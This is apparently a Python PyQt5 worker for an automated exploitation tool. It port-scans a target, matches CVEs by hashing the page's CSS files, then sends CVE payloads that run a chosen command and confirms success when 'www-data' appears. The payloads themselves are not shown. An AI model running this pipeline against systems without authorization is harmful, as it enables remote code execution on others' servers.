# -*- coding: utf-8 -*-
"""Auto Test Worker - 自动化测试工作线程"""

import os
import sys
from PyQt5.QtCore import QThread, pyqtSignal

# 添加项目根目录到路径
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))


class AutoTestWorker(QThread):
    """自动化测试工作线程"""
    log_signal = pyqtSignal(str)
    detail_signal = pyqtSignal(dict)  # {'cve':str,'executed_ports':list,'success':bool,'success_port':int|None}
    finished = pyqtSignal(int, int)  # success_count, total_count
    error = pyqtSignal(str)

    def __init__(self, url, cmd, fp_timeout, send_timeout, do_port_scan: bool = False,
                 ports: list = None, port_timeout: int = 2, verbose: bool = False):
        super().__init__()
        self.url = url
        self.cmd = cmd
        self.fp_timeout = fp_timeout
        self.send_timeout = send_timeout
        # 端口扫描配置
        self.do_port_scan = do_port_scan
        self.ports = ports
        self.port_timeout = port_timeout
        # 中断标志
        self._stop_flag = False
        # 日志级别：False=简洁（仅显示结果），True=详细
        self.verbose = verbose

    def stop(self):
        """请求停止扫描"""
        self._stop_flag = True
        self.log_signal.emit("[*] 正在停止扫描...")

    def _log(self, msg: str, force: bool = False):
        """
        条件性日志输出。
        force=True 时无视 verbose 设置，始终输出（用于关键信息）
        """
        if self.verbose or force:
            self.log_signal.emit(msg)

    def _check_stop(self):
        """检查是否需要停止"""
        return self._stop_flag

    def run(self):
        success_count = 0
        total_cves = 0
        try:
            from urllib.parse import urlparse
            from src.core.fingerprint import get_css_files_md5_from_page
            from src.core.payload_sender import PayloadManager
            from src.core.port_scanner import scan_ports

            # 简洁模式只显示关键信息
            self._log("=" * 60, force=True)
            self._log("自动化测试", force=True)
            self._log("=" * 60, force=True)
            self._log(f"目标: {self.url}", force=True)
            self._log(f"执行命令: {self.cmd}", force=True)
            self._log("=" * 60 + "\n", force=True)

            # 步骤1：端口扫描 -> 对每个开放端口进行指纹识别
            self._log("[*] 步骤1: 端口扫描（若启用）并对开放端口进行指纹识别...")

            # 检查中断标志
            if self._check_stop():
                self._log("[!] 扫描已被中断", force=True)
                self.finished.emit(success_count, total_cves)
                return

            # 解析主机与提供的端口
            provided_port = None
            base_host = ""
            if '://' in self.url:
                parsed = urlparse(self.url)
                base_host = parsed.hostname or ''
                provided_port = parsed.port
            else:
                if ':' in self.url:
                    try:
                        host_part, port_part = self.url.rsplit(':', 1)
                        base_host = host_part
                        provided_port = int(port_part)
                    except Exception:
                        base_host = self.url
                        provided_port = None
                else:
                    base_host = self.url
                    provided_port = None

            # 进行端口扫描（若启用），否则使用提供的端口或默认80
            ports_to_scan = [provided_port] if provided_port else [80]
            open_ports = []
            if self.do_port_scan and scan_ports is not None:
                try:
                    self._log(f"    [+] 扫描目标: {base_host}")
                    scan_results = scan_ports(
                        base_host,
                        self.ports,
                        timeout=self.port_timeout,
                        log_callback=lambda msg: self._log(msg),
                        stop_flag=self._check_stop
                    )
                    open_ports = sorted([p for p, (is_open, _) in scan_results.items() if is_open])
                    if open_ports:
                        self._log(f"    [+] 发现开放端口: {', '.join(str(p) for p in open_ports)}", force=True)
                    else:
                        self._log("    [-] 未发现开放端口，使用提供端口或默认 80", force=True)
                        open_ports = ports_to_scan
                except Exception as e:
                    self._log(f"[!] 端口扫描出错: {e}", force=True)
                    open_ports = ports_to_scan
            else:
                open_ports = ports_to_scan

            # 对每个开放端口做指纹识别，收集匹配到的 CVE（按端口映射）
            if get_css_files_md5_from_page is None:
                self.error.emit("指纹模块未加载")
                self.finished.emit(success_count, total_cves)
                return

            matched_cves_per_port = {}  # cve -> set(ports)
            for port in open_ports:
                # 检查中断标志
                if self._check_stop():
                    self._log("[!] 扫描已被中断", force=True)
                    self.finished.emit(success_count, total_cves)
                    return

                try:
                    url_for_fp = f"http://{base_host}:{port}/"
                    self._log(f"    [*] 对 {url_for_fp} 进行指纹识别...")

                    # 再次检查中断标志（在长时间操作前）
                    if self._check_stop():
                        self._log("[!] 扫描已被中断", force=True)
                        self.finished.emit(success_count, total_cves)
                        return

                    css_md5_dict = get_css_files_md5_from_page(url_for_fp, self.fp_timeout)

                    # 再次检查中断标志（在长时间操作后）
                    if self._check_stop():
                        self._log("[!] 扫描已被中断", force=True)
                        self.finished.emit(success_count, total_cves)
                        return

                    if not css_md5_dict:
                        self._log(f"    [-] {url_for_fp} 未提取到 CSS 或访问失败")
                        continue

                    for css_url, info in css_md5_dict.items():
                        if isinstance(info, tuple):
                            md5_hash, cve_id = info
                        else:
                            md5_hash, cve_id = info, None
                        if md5_hash and cve_id:
                            # 简洁模式下不显示每个 CSS 文件的 MD5，只在详细模式显示
                            self._log(f"        [+] {css_url} → CVE: {cve_id}")
                            matched_cves_per_port.setdefault(cve_id, set()).add(port)
                except Exception as e:
                    self._log(f"    [!] 指纹识别出错 ({base_host}:{port}): {e}", force=True)

            matched_cves = set(matched_cves_per_port.keys())
            if not matched_cves:
                self.error.emit("未匹配到任何CVE，自动化测试结束")
                self.finished.emit(success_count, total_cves)
                return

            self._log(f"\n[+] 匹配到的 CVE: {', '.join(sorted(matched_cves))}", force=True)

            # 步骤2：执行Payload
            self._log(f"\n[*] 步骤2: 执行Payload...", force=True)

            # 确定待测试的主机与端口列表
            base_host = ""
            provided_port = None
            if '://' in self.url:
                parsed = urlparse(self.url)
                base_host = parsed.hostname or ''
                provided_port = parsed.port
            else:
                # 处理 IP 或 IP:port 情况
                if ':' in self.url:
                    try:
                        host_part, port_part = self.url.rsplit(':', 1)
                        base_host = host_part
                        provided_port = int(port_part)
                    except Exception:
                        base_host = self.url
                        provided_port = None
                else:
                    base_host = self.url

            payload_manager = PayloadManager(debug=False)
            success_count = 0
            total_cves = len(matched_cves)

            # 对每个匹配到的 CVE，只在该 CVE 匹配到的端口上执行对应 Payload
            for cve_id in sorted(matched_cves):
                # 检查中断标志
                if self._check_stop():
                    self._log("[!] 扫描已被中断", force=True)
                    self.finished.emit(success_count, total_cves)
                    return
                ports_for_cve = sorted(matched_cves_per_port.get(cve_id, [])) or []
                # 保存原始尝试端口，用于在结果汇总中展示完整的尝试端口
                attempted_ports = ports_for_cve.copy()

                module_name = cve_id.replace('-', '_')
                self._log(f"\n{'='*60}", force=True)
                self._log(f"[*] 尝试执行 Payload: {module_name}", force=True)
                self._log(f"    匹配端口: {', '.join(str(p) for p in ports_for_cve) if ports_for_cve else '(无)'}", force=True)
                self._log("=" * 60, force=True)

                cve_success = False
                success_port = None
                success_ports = []

                if not ports_for_cve:
                    self._log(f"    [!] 未在任何端口匹配到 {module_name} 的指纹，跳过执行", force=True)
                else:
                    # 对所有匹配端口都尝试执行，并收集成功的端口，失败的端口将被剔除
                    for port in ports_for_cve:
                        # 检查中断标志
                        if self._check_stop():
                            self._log("[!] 扫描已被中断", force=True)
                            self.finished.emit(success_count, total_cves)
                            return
                        ip_port = f"{base_host}:{port}"
                        self._log(f"    [*] 目标: {ip_port}，执行命令: {self.cmd}")
                        try:
                            # 执行 Payload
                            result = payload_manager.send_payload_safe(
                                module_name, ip_port, self.cmd,
                                timeout=self.send_timeout,
                                log_callback=lambda msg: self._log(f"    {msg}")
                            )
                            if result is not None:
                                response_text = result.text if hasattr(result, 'text') else str(result)
                                if 'www-data' in response_text:
                                    # 该端口执行成功，记录但继续检测其它端口
                                    if not cve_success:
                                        # 首次发现成功计数一次（按 CVE 计）
                                        cve_success = True
                                        success_count += 1
                                    if success_port is None:
                                        success_port = port
                                    success_ports.append(port)
                                    self._log(f"    [+] {module_name} 在 {ip_port} 执行成功！检测到 www-data", force=True)
                                else:
                                    self._log(f"    [-] {module_name} 在 {ip_port} 响应未检测到 www-data")
                            else:
                                self._log(f"    [-] {module_name} 在 {ip_port} 无响应")
                        except Exception as e:
                            self._log(f"    [!] {module_name} 在 {ip_port} 执行出错: {e}", force=True)

                # 只保留成功的端口（用于后续自动执行/保存等操作）
                success_ports_sorted = sorted(success_ports)
                # 同步更新 matched_cves_per_port，便于后续逻辑或UI使用
                if success_ports_sorted:
                    matched_cves_per_port[cve_id] = set(success_ports_sorted)
                else:
                    # 如果没有成功端口，从映射中移除该 CVE
                    if cve_id in matched_cves_per_port:
                        matched_cves_per_port.pop(cve_id, None)

                # 发送单个 CVE 详情到 UI（用于表格展示）
                try:
                    # 同步返回 host 信息，便于 GUI 操作该 CVE（查看/执行/保存）
                    self.detail_signal.emit({
                        "cve": cve_id,
                        # attempted_ports: 原始尝试的端口（全部）
                        "attempted_ports": attempted_ports,
                        # executed_ports: 实际成功的端口（可能为空）
                        "executed_ports": success_ports_sorted,
                        "success": cve_success,
                        "success_port": success_port,
                        "host": base_host
                    })
                except Exception:
                    pass

            # 最终输出：列出匹配到的 CVE，并给出统计
            self._log("\n" + "=" * 60, force=True)
            self._log(f"匹配到的 CVE 列表: {', '.join(sorted(matched_cves))}", force=True)
            self._log(f"成功执行的 CVE 数: {success_count}/{total_cves}", force=True)
            self._log("=" * 60, force=True)
            self.finished.emit(success_count, total_cves)

        except Exception as e:
            self.error.emit(str(e))
